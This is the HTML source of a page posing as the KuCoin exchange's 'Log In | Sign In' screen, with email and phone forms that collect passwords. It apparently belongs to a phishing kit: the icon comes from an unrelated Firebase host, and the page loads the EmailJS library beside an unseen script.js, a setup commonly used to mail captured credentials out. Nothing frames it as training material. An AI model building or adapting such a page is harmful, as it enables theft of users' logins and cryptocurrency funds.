<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta
      name="description"
      content="Sign in to KuCoin and start trading cryptocurrencies."
    />
    <link rel="apple-touch-icon" href="/kucoin-base-web/img/logo/512.png" />
    <link rel="icon" href="/logo.png" />
    <link
      rel="shortcut icon"
      href="https://younk-5b894.web.app/images/logo.png"
      type="image/x-icon"
    />
    <title>KuCoin: Log In | Sign In</title>
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
      integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA=="
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
    />
    <link rel="stylesheet" href="style.css" />
  </head>
  <body>
    <div class="container">
      <div class="wrapper">
        <a href="#"><div class="signup">Sign Up</div></a>
        <div class="title">Log In</div>
        <div class="tab_box">
          <div class="tab_btn activeBar" onclick="toggleTab('email')">
            Email
          </div>
          <div class="tab_btn two" onclick="toggleTab('phone')">
            Phone Number
          </div>
        </div>
        <div class="content_box active" id="emailContent">
          <div class="content">
            <form method="post" id="EmailForm">
              <div class="formInput">
                <input type="text" id="email" name="email" required />
                <div class="label">Address</div>
              </div>
              <div class="formInput">
                <input
                  type="password"
                  id="EmailPassword"
                  name="emailPassword"
                  required
                />
                <div class="label">Password</div>
                <i class="eye-icon fa-regular fa-eye-slash"></i>
              </div>
              <div class="fgp">Forgot password?</div>
              <button class="emailBtn">Log in</button>
            </form>
          </div>
        </div>
        <div class="content_box" id="phoneContent">
          <div class="content">
            <form method="post" id="PhoneForm">
              <div class="select-box">
                <div class="selected-option">
                  <div class="flex">
                    <strong>+44</strong>
                    <i class="fa-solid fa-chevron-up"></i>
                  </div>
                  <input
                    class="phone_number"
                    type="tel"
                    name="tel"
                    id="phoneNumber"
                    placeholder="Phone Number"
                    oninput="this.value = this.value.replace(/[^0-9]/g, '')"
                    inputmode="numeric"
                    pattern="[0-9]*"
                  />
                </div>
                <div class="options">
                  <input
                    type="text"
                    class="search-box"
                    placeholder="Search Country Name"
                  />
                  <ol></ol>
                </div>
              </div>
              <div class="formInput">
                <input
                  type="password"
                  id="PhonePassword"
                  name="password"
                  required
                />
                <div class="plabel">Password</div>
                <i class="eye-icon fa-regular fa-eye-slash"></i>
              </div>
              <div class="fgp">Forgot password?</div>

              <button class="phoneBtn">Log in</button>
            </form>
          </div>
        </div>
      </div>
    </div>
    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script src="script.js"></script>
  </body>
</html>
